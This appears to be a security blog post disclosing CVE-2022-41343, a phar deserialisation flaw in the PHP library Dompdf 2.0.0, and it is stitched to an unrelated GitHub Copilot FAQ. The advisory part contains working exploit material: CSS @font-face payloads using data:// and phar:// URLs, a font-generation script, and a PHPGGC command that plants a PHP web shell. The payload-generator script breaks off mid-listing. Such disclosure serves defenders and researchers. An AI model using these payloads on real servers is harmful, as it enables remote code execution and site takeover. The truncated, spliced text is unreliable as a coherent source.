Dompdf is a popular library in PHP used for rendering PDF files from HTML. Tanto Security disclosed a vulnerability in Dompdf affecting version 2.0.0 and below. The vulnerability was patched in Dompdf v2.0.1. We recommend all Dompdf users update to the latest version as soon as possible. Exploitation of the vulnerability results in remote code execution subject to the following conditions. The application is deployed on PHP <= 7.x and a well-known RCE deserialization gadget exists in any of the applications libraryâs.

## Introduction

In this blogpost we will cover the details of CVE-2022-41343. We start by analysing the source code of Dompdf v2.0.0. We will then look at patches released for previous vulnerabilities. Finally we will provide payloads that can be used to exploit CVE-2022-41343.

On 30/09/2022 the Tanto Security team did a presentation at a local cybersecurity meetup known as Ruxmon in Melbourne - Australia. This presentation covered the vulnerability details and basic PHP concepts needed to exploit it. If you are interested in that presentation the slides can be found [downloaded here](CVE-2022-41343_Ruxmon_09-2022.pdf).

## How this research started?

We started by analysing previous vulnerabilities in Dompdf and reading the source code for [v2.0.0](https://github.com/dompdf/dompdf/tree/v2.0.0). Some of the patches for the previous vulnerabilities did not properly address some issues. In particular the patch for [CVE-2022-28368 (RCE via Remote CSS Font Cache Installation)](https://positive.security/blog/dompdf-rce) still allowed for file uploads. Additionaly, the patch for [CVE-2021-3838 (Deserialization of Untrusted Data)](https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/) had a small, but lethal, code mistake. By combining these two issues we could achieve remote code execution.

But before we dive into the details of our findings, we first need to discuss these previous vulnerabilities since we use some concepts and the same entrypoints of some of them.

## Past Vulnerabilities on DomPDF

* **CVE-2022-28368 - RCE via Remote CSS Font Cache Installation (by Positive Security) patched on v1.2.1**
* CVE-2021-3902 - Improper Restriction of XML External Entity Reference (by Haxatron via Huntr.dev) patched on v2.0.0
* **CVE-2021-3838 - Deserialization of Untrusted Data (by Haxatron via Huntr.dev) patched on v2.0.0**
* CVE-2022-2400 - External Control of File Name or Path (by Haxatron via Huntr.dev) patched on v2.0.0
* CVE-2022-0085 - Server-Side Request Forgery (by Haxatron via Huntr.dev) patched on v2.0.0

## CVE-2022-28368 - RCE via Remote CSS Font Cache Installation

* Positive Security identified that when `$isRemoteEnabled=true`, Dompdf can access remote font files and cache those files on disk using the same extension as the remote file.
* The cached fonts are stored in the directory `/vendor/dompdf/dompdf/lib/fonts/` with the format: `[font_name]_[font_weight]_[md5(src:url)].[extension]`
* If the fonts cache directory is exposed to the internet, attackers can achieve remote code execution. This can be done by creating a valid font with the extension `.php` and a `comment` or `copyright` field containing malicious PHP code (e.g. `<?php system($_GET[0]); ?>`).
* Positive Security released a great blogpost about this vulnerability that can be accessed [here](https://positive.security/blog/dompdf-rce).

## The patch for CVE-2022-28368

[![Patch for CVE-2022-28368](patch_CVE-2022-28368.png)](patch_CVE-2022-28368.png)

*Figure 1. The patch for CVE-2022-28368. [Click here](https://github.com/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a#diff-a0473fa74c65efedd487f657d52cb196245a84d2b13e622818dd0d7283da6d38) to access the patch diff*

### Conclusions from the patch:

* It now forces the cached font to have the extension `.ttf`. This removes the possibility to achieve RCE using `.php` as the extension when the `/vendor/` directory is exposed… **But…**
* It doesnât address the fact that arbitrary contents can still be present in the font file. So, in theory a polyglot font file would still be a valid font, bypassing the font validation and writing a potentialy malicious file to disk…
* It doesnât address the fact that remote files are still being saved to disk with a predictable filename in the format `[font_name]_[font_weight]_[md5(src:url)].ttf`.
* In conclusion, it patches the vulnerability but the arbitrary file upload with predictable filenames still exists!

## CVE-2021-3838 - Deserialization of Untrusted Data

* Haxatron reported that Dompdf accepts the `phar://` wrapper in any HTML element that uses the `src` attribute. After Hexatron’s report the issue was patched with the release of v2.0.0. Interestingly, ([jurysosnovsky](https://github.com/jurysosnovsky)) had [already reported](https://github.com/dompdf/dompdf/pull/1903) this to Dompdf mantainers back in 2019!
* In Haxatron’s [report](https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/) he explicitly states that a vulnerable application using Dompdf would need to have an upload functionality for this attack to work. It’s true, but we already know that the patch for CVE-2022-28368 doesn’t address the upload issue and we can abuse this behaviour to upload a polyglot font file to the fonts cache directory.

### Dompdf v2.0.0 and the creation of the `$allowedProtocols` list

One of the biggest changes in v2.0.0 was the creation of the `$allowedProtocols` list and its validation `rules`. Now, only the protocols `file://`, `http://` and `https://` are allowed by default in any HTML element that uses the `src` attribute. The source code for these changes can be observed in the [`src/Options.php`](https://github.com/dompdf/dompdf/blob/79573d8b8a141ec8a17312515de8740eed014fa9/src/Options.php#L529) file. For the convenience of the reader we have added the most important bits below:

```
[...]
    public function __construct(array $attributes = null)
    {
      [...]
        $this->setAllowedProtocols(["file://", "http://", "https://"]);

    }
    public function getAllowedProtocols()
    {
        return $this->allowedProtocols;
    }
    /**

     * formatted as ["protocol://" => ["rules" => [callable]], ...]
     * or ["protocol://", ...]
     *
     * @return $this
     */
    public function setAllowedProtocols(array $allowedProtocols)
    {
        $protocols = [];
        foreach ($allowedProtocols as $protocol => $config) {
            if (is_string($protocol)) {
                $protocols[$protocol] = [];
                if (is_array($config)) {
                    $protocols[$protocol] = $config;
                }
            } elseif (is_string($config)) {
                $protocols[$config] = [];
            }
        }
        $this->allowedProtocols = [];
        foreach ($protocols as $protocol => $config) {
            $this->addAllowedProtocol($protocol, ...($config["rules"] ?? []));
        }
        return $this;
    }
    /**

     */
    public function addAllowedProtocol(string $protocol, callable ...$rules)
    {
        $protocol = strtolower($protocol);
        if (empty($rules)) {
            $rules = [];
            switch ($protocol) {
                case "file://":
                    $rules[] = [$this, "validateLocalUri"];
                    break;
                case "http://":
                case "https://":
                    $rules[] = [$this, "validateRemoteUri"];
                    break;
                case "phar://":
                    $rules[] = [$this, "validatePharUri"];
                    break;
            }
        }
        $this->allowedProtocols[$protocol] = ["rules" => $rules];
        return $this;
    }
    public function validateLocalUri(string $uri)
    {
        if ($uri === null || strlen($uri) === 0) {
            return [false, "The URI must not be empty."];
        }
        $realfile = realpath(str_replace("file://", "", $uri));
        $dirs = $this->chroot;
        $dirs[] = $this->rootDir;
        $chrootValid = false;
        foreach ($dirs as $chrootPath) {
            $chrootPath = realpath($chrootPath);
            if ($chrootPath !== false && strpos($realfile, $chrootPath) === 0) {
                $chrootValid = true;
                break;
            }
        }
        if ($chrootValid !== true) {
            return [false, "Permission denied. The file could not be found under the paths specified by Options::chroot."];
        }
        if (!$realfile) {
            return [false, "File not found."];
        }
        return [true, null];
    }
    public function validatePharUri(string $uri)
    {
        if ($uri === null || strlen($uri) === 0) {
            return [false, "The URI must not be empty."];
        }
        $file = substr(substr($uri, 0, strpos($uri, ".phar") + 5), 7);
        return $this->validateLocalUri($file);
    }
    public function validateRemoteUri(string $uri)
    {
        if ($uri === null || strlen($uri) === 0) {
            return [false, "The URI must not be empty."];
        }
        if (!$this->isRemoteEnabled) {
            return [false, "Remote file requested, but remote file download is disabled."];
        }
        return [true, null];
    }
[...]

```

The Dompdf mantainers modified the code base to validate URLs using the `$allowedProtocols` list with checks similar to the one below. The full source code for this snippet can be found at [src/Css/Stylesheet.php](https://github.com/dompdf/dompdf/blob/v2.0.0/src/Css/Stylesheet.php):

```
    function load_css_file($file, $origin = self::ORIG_AUTHOR)
    {
	[...]
        if (strpos($file, "data:") === 0) {
            $parsed = Helpers::parse_data_uri($file);
            $css = $parsed["data"];
        } else {
            $options = $this->_dompdf->getOptions();
            $parsed_url = Helpers::explode_url($file);
            $protocol = $parsed_url["protocol"];
            if ($file !== $this->getDefaultStylesheet()) {
                $allowed_protocols = $options->getAllowedProtocols();
                if (!array_key_exists($protocol, $allowed_protocols)) {
                    Helpers::record_warnings(E_USER_WARNING, "Permission denied on $file. The communication protocol is not supported.", __FILE__, __LINE__);
                    return;
                }
                foreach ($allowed_protocols[$protocol]["rules"] as $rule) {
                    [$result, $message] = $rule($file);
                    if (!$result) {
                        Helpers::record_warnings(E_USER_WARNING, "Error loading $file: $message", __FILE__, __LINE__);
                        return;
                    }
                }
            }
            [$css, $http_response_header] = Helpers::getFileContent($file, $this->_dompdf->getHttpContext());
            $good_mime_type = true;
	[...]
	}

```

As can be observed, the application first parses the URL to get the protocol. Then before invoking `Helpers::getFileContent()`, to download the file, it validates if the protocol is in the `$allowedProtocols` list. If either check fails, the application logs a warning message and will `return` without processing the file.

**Cool!** it seems to be a good patch and solves the problem by disabling `phar://` by default. **But..**. Will it be the same case in all modified code? One thing that I have learnt from all these years in the industry is “trust but verify!”… So after reading all the code changes, I found something… let’s say… a little bit peculiar… 😏

## The ~~0-day~~ CVE-2022-41343

Lets have a look at the culprit! The below code is from the `registerFont()` function from [`src/FontMetrics.php`](https://github.com/dompdf/dompdf/blob/v2.0.0/src/FontMetrics.php). This is the same function abused by Positive Security in CVE-2022-28368 and previously patched in v1.2.1.

```
public function registerFont($style, $remoteFile, $context = null)
{
    [...]
        $entry[$styleString] = $localFile;
        // Download the remote file
        [$protocol] = Helpers::explode_url($remoteFile);
        $allowed_protocols = $this->options->getAllowedProtocols();
        if (!array_key_exists($protocol, $allowed_protocols)) {
            Helpers::record_warnings(E_USER_WARNING, "Permission denied on $remoteFile. The communication protocol is not supported.", __FILE__, __LINE__);
        }
        foreach ($allowed_protocols[$protocol]["rules"] as $rule) {
            [$result, $message] = $rule($remoteFile);
            if ($result !== true) {
                Helpers::record_warnings(E_USER_WARNING, "Error loading $remoteFile: $message", __FILE__, __LINE__);
            }
        }
        list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context);
        if ($remoteFileContent === null) {
            return false;
        }
    [...]
}

```

Cool, the validation is there… But I think something is missing no? 🤔

Here, the `return` statements are missing after the validations! Meaning that we can use any protocol (including `phar://`) and still guarantee that using this entrypoint our URL will hit `Helpers::getFileContents()`.

Now, lets have a look into `Helpers::getFileContent()` located at [`src/Helpers.php`](https://github.com/dompdf/dompdf/blob/v2.0.0/src/Helpers.php#L892):

```
[...]
    public static function getFileContent($uri, $context = null, $offset = 0, $maxlen = null)
    {
        $content = null;
        $headers = null;
        [$protocol] = Helpers::explode_url($uri);
        $is_local_path = in_array(strtolower($protocol), ["", "file://", "phar://"], true);
        $can_use_curl = in_array(strtolower($protocol), ["http://", "https://"], true);
        set_error_handler([self::class, 'record_warnings']);
        try {
            if ($is_local_path || ini_get('allow_url_fopen') || !$can_use_curl) {
                if ($is_local_path === false) {
                    $uri = Helpers::encodeURI($uri);
                }
                if (isset($maxlen)) {
                    $result = file_get_contents($uri, false, $context, $offset, $maxlen);
                } else {
                    $result = file_get_contents($uri, false, $context, $offset);
                }
                if ($result !== false) {
                    $content = $result;
                }
                if (isset($http_response_header)) {
                    $headers = $http_response_header;
                }
            } elseif ($can_use_curl && function_exists('curl_exec')) {
 				[...]
            }
        } finally {
            restore_error_handler();
        }
        return [$content, $headers];
    }
[...]

```

As we can see, the `$is_local_path` will be true if `$protocol` is empty (meaning its a file path) or if its equal to `file://` or `phar://`. Additionaly, the variable `$can_use_curl` will be true if `$protocol` is equal to `http://` or `https://`. Following the code, if we use `phar://` or `data://` as the protocol scheme in our URL, it will always enter in the first `if` statement and reach `file_get_contents()`. This means that we can use the `data://` protocol to write a polyglot truetype-phar file to disk and then send another request using `phar://` to trigger the deserialisation. This behaviour eliminates the need of `$isRemoteEnable=true` to exploit this vulnerability, meaning that we can achieve RCE even if the target application doesn’t have internet connectivity.

All right, enough talk lets see how we can achieve RCE in a vulnerable application. 😄

## How to exploit this vulnerability?

To demonstrate the critical impact of this vulnerability we created a simple PHP application using Dompdf v2.0.0 and Monolog v1.27.0. For the purposes of this POC this version of Monolog was chosen because it has a well-known deserialisation gadget that can result in Remote Code Execution. This gadget is present in the [PHPGGC](https://github.com/ambionics/phpggc) project that we will also use to build our TrueType-Phar polyglot file.

To exploit this vulnerability we need to send two requests. The first request will be used to write a polyglot truetype-phar file via the `data://` protocol scheme. The payload will look like the following:

```
<style>
	@font-face {
		font-family:'exploit';
		src:url('data:text/plain;base64,double_url_encode([BASE64_POLYGLOT_TRUETYPE-PHAR])');
		font-weight:'normal';
		font-style:'normal';
	}
</style>

```

Note the `double_url_encode` in the base64 payload means that we should double URL encode it before sending it to the application. This way, Dompdf and PHP will properly handle the payload and successfully decode it when parsing the `data://` URL.

The second request will be used to trigger the deserialisation via the `phar://` protocol pointing to our TrueType-Phar polyglot file. The payload will look like the following:

```
<style>
	@font-face {
		font-family:'exploit';
		src:url('phar://path/to/app/vendor/dompdf/dompdf/lib/fonts/exploit_normal_[md5(data:text/plain;base64,[BASE64_POLYGLOT_TRUETYPE-PHAR])].ttf##');
		font-weight:'normal';
		font-style:'normal';
	}
</style>

```

To generate a basic TrueType font we created a python script using `fontforge` (`pip3 install fontforge`). You can download this script [here](generate_font.py). The script is outlined as follows:

```
#!/usr/bin/env python3
import fontforge
import os
import sys
import tempfile
from typing import Optional
def main():
    sys.stdout.buffer.write(do_generate_font())
def do_generate_font() -> bytes:
    fd, fn = tempfile.mkstemp(suffix=".ttf")
    os.close(fd)
    font = fontforge.font()
    font.copyright = "DUMMY FONT"
    font.generate(fn)
    with open(fn, "rb") as f:
        res = f.read()
    os.unlink(fn)
    result = res
    return result
if __name__ == "__main__":
    main()

```

To generate the generic TrueType font named `font.ttf` file we simply need to execute:

```
% python3 generate_font.py > font.ttf
Warning: Font contained no glyphs

```

To generate a valid TrueType-phar polyglot with the Monolog payload that will work in our version we used the [PHPGGC](https://github.com/ambionics/phpggc) project. To generate this file we simply need to execute:

```
% php -d phar.readonly=0 phpggc Monolog/RCE1 system "echo '<?php system(\$_GET[0]); ?>' > /var/www/html/shell.php" -p phar -pp font.ttf -o font-polyglot.phar

```

As can be observed, on sucessfull deserialisation, our target application will write a file named `shell.php` into the public web directory of the application with the contents `<?php system($_GET[0]); ?>` (a minimal PHP web shell).

In the next step we need to build the two requests to exploit our target application. Since this involves some string manipulation and calculation of the md5 hash of the `data://` URI, we created a simple python script that will generate these payloads for us. You can download this script [here](generate_payload.py). This script is outlined below:

```
#!/usr/bin/env python3

* `2022-10-06` - Public disclosure.

## Conclusion

While investigating past vulnerabilities in Dompdf, and the patches applied as attempts to address these vulnerabilities, we identified other opportunities to abuse Dompdf and achieve code execution. During this process, v2.0.0 was released and Tanto Security identified a small code mistake that ultimately lead to code execution via Phar Deserialisation in this version as well.

This vulnerability was patched in Dompdf v2.0.1 and we recommend to all Dompdf users to update their installations to the latest version as soon as possible.

## Thanks

We would like to thank Brian Sweeney, the official mantainer of Dompdf for the quick response and for the fix of the vulnerability.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

